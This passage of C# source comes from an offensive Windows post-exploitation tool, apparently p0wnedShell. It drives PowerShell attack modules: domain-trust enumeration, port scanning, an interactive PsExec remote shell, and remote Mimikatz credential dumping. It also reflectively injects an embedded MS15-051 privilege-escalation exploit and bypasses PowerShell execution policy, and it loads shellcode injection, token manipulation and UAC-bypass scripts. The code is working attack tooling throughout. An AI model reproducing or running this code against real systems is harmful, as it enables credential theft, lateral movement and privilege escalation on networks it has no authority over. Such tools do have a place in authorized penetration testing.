            string NetDomainTrust = "Get-NetDomainTrust";
            string MapDomainTrust = "Invoke-MapDomainTrust -LDAP";
            try
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Getting the forest associated with the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetForest));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Getting all domains for the current forest.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetForestDomain));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Getting all trusts for the forest associated with the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetForestTrust));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Getting the name of the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetDomain));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Return the SID for the specified domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(DomainSID));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Getting all trusts for the current user's domain.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(NetDomainTrust));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Let's try to build a relational mapping of all Domain trusts.\n");
                Console.ResetColor();
                Console.WriteLine(RunPSCommand(MapDomainTrust));
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        public static void PortScan()
        {
            string[] toPrint = { "* Scan for IP-Addresses, HostNames and open Ports in your Network.  *" };
            Program.PrintBanner(toPrint);

            IPAddress Start = IPAddress.Parse("1.1.1.1");
            IPAddress End = IPAddress.Parse("1.1.1.1");
            string Ports = "";

            while (true)
            {
                try
                {
                    Console.Write("Enter start ip address to scan from (e.g. 192.168.1.1): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Start = IPAddress.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            while (true)
            {
                try
                {
                    Console.Write("Enter end ip address to scan to (e.g. 192.168.1.253): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    End = IPAddress.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            int Failed;
            do
            {
                Failed = 0;
                Console.Write("Now Enter the port or port range to scan (e.g. 445 or 80,445,5985): ");
                Console.ForegroundColor = ConsoleColor.Green;
                Ports = Console.ReadLine();
                Console.ResetColor();

                foreach (string value in Ports.Split(','))
                {
                    try
                    {
                        int.Parse(value);
                        if (Int32.Parse(value) < 1 || Int32.Parse(value) > 65535)
                        {
                            Failed += 1;
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                            Console.ResetColor();
                        }
                    }
                    catch
                    {
                        Failed += 1;
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                }
            }
            while (Failed != 0);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Please wait while running our scan...\n");
            Console.ResetColor();

            string PortScan = "Port-Scan -StartAddress " + Start + " -EndAddress " + End + " -ResolveHost -ScanPort -Port " + Ports + " | ft -autosize";
            try
            {
                P0wnedListener.Execute(PortScan);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void PsExec()
        {
            string[] toPrint = { "* Use PsExec to execute commands on remote system.                  *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("\n[+] For this attack to succeed, you need to have Admin privileges.");
            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
            string Hostname = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the hostname of the machine you want to run your commands on (e.g. dc1.gotham.local) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Hostname = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (Hostname == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }
            PsExecShell(Hostname);

        }

        public static void Remote_Mimikatz()
        {
            string[] toPrint = { "* Execute Mimikatz on a remote computer to dump credentials.        *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("\n[+] For this attack to succeed, you need to have Admin privileges.");
            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
            string Hostname = null;
            string Creds = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the fqdn hostname of the machine you want to dump the credentials (e.g. dc1.gotham.local) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Hostname = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (Hostname == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            string Remote_Mimikatz = "Invoke-Mimikatz -DumpCreds -ComputerName \"" + Hostname + "\"";
            try
            {
                Creds = RunPSCommand(Remote_Mimikatz);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            if (Creds.Length <= 5)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Oops something went wrong, maybe a wrong Hostname?\n");
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine(RunPSCommand(Remote_Mimikatz));
            }
            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void ReactShell()
        {
            Console.Clear();
            Console.Write("[+] Please wait until loaded...\n");
            Console.WriteLine();

            string React = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ReactOS() + "\" -split ' ') -ForceASLR -FuncReturnType Void -Verbose";
            try
            {
                P0wnedListener.Execute(React);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void PsExecShell(string Hostname)
        {
            string TestConnection = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"whoami\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
            RunPSCommand(TestConnection);
            if (!File.Exists(Program.P0wnedPath() + "\\Result.txt"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Cannot connect to server, probably insufficient permission or a firewall blocking our connection.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }
            File.Delete(Program.P0wnedPath() + "\\Result.txt");
            Console.WriteLine();

            while (true)
            {
                int bufSize = 8192;
                Stream inStream = Console.OpenStandardInput(bufSize);
                Console.SetIn(new StreamReader(inStream, Console.InputEncoding, false, bufSize));

                Console.Write("[system@" + Hostname + " ~]$ ");
                string cmd = Console.ReadLine();
                string PsExec = "Invoke-PsExec -ComputerName " + Hostname + " -Command \"" + cmd + "\" -ResultFile \"" + Program.P0wnedPath() + "\\Result.txt\"";
                string Result = null;
                if (cmd == "exit")
                {
                    return;
                }
                else if (cmd == "quit")
                {
                    return;
                }
                else
                {
                    try
                    {
                        RunPSCommand(PsExec);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                if (File.Exists(Program.P0wnedPath() + "\\Result.txt"))
                {
                    Result = System.IO.File.ReadAllText(Program.P0wnedPath() + "\\Result.txt");
                    System.Console.WriteLine("{0}", Result);
                    File.Delete(Program.P0wnedPath() + "\\Result.txt");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[+] Oops something went wrong, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                }

            }
        }

        public static void AccessCheck()
        {
            string[] toPrint = { "* Run sysinternals accesschk to determin writable directories.       *" };
            Program.PrintBanner(toPrint);

            Console.Write("[+] You can build your own command line, or you can let the default run (osdrive checkup with BUILTIN\\Users) > ");
            Console.WriteLine("\n[+] Want to build your own command line? (y/n) >");
            string input = Console.ReadLine();
            string commandline = "";
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the commandline you want to execute > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    commandline = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    break;
                case "n":
                    string path = Path.GetPathRoot(Environment.SystemDirectory);
                    commandline = @"BUILTIN\Users -qswu " + path + " /accepteula";
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to start over...");
                    Console.ReadLine();
                    AccessCheck();
                    return;
            }

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Commandline: \"accesschk.exe " + commandline + "\"");
            Console.ResetColor();
            Console.WriteLine("[+] Press Enter to Start...");
            Console.ReadLine();

            string AccessChk = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.AccessChk() + "\" -split ' ') -ExeArgs \"" + commandline + "\" -Verbose";
            try
            {
                P0wnedListener.Execute(AccessChk);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("[+] Press any key to continue...");
            Console.ReadLine();
        }

        public static void MS15_051()
        {
            Console.Write("[+] Press enter to execute MS15-051 > ");
            string input = Console.ReadLine();
            string MS15_051 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ms15_051() + "\" -split ' ') -Verbose";
            try
            {
                P0wnedListener.Execute(MS15_051);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        //Based on Jared Atkinson's And Justin Warner's Work
        public static string RunPSCommand(string cmd)
        {
            //Init stuff
            InitialSessionState initial = InitialSessionState.CreateDefault();
            // Replace PSAuthorizationManager with a null manager which ignores execution policy
            initial.AuthorizationManager = new System.Management.Automation.AuthorizationManager("MyShellId");

            Runspace runspace = RunspaceFactory.CreateRunspace(initial);
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            if (cmd.IndexOf("Invoke-Shellcode", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_Shellcode());
            }
            if (cmd.IndexOf("Invoke-Mimikatz", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_Mimikatz());
            }
            if (cmd.IndexOf("Invoke-ReflectivePEInjection", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_ReflectivePEInjection());
            }
            if (cmd.IndexOf("Invoke-PsExec", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_PsExec());
            }
            if (cmd.IndexOf("Invoke-TokenManipulation", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_TokenManipulation());
            }
            if (cmd.IndexOf("PowerCat", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.PowerCat());
            }
            if (cmd.IndexOf("Invoke-PsUACme", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_PsUACme());
            }
            if (cmd.IndexOf("Invoke-Encode", 0, StringComparison.OrdinalIgnoreCase) != -1)
            {
                pipeline.Commands.AddScript(Resources.Invoke_Encode());
            }

            pipeline.Commands.AddScript(Resources.Invoke_PowerView());
            pipeline.Commands.AddScript(Resources.Invoke_PowerUp());
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString();
        }

        public static void RunPSFile(string script)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript(script).Invoke();
        }
    }

}
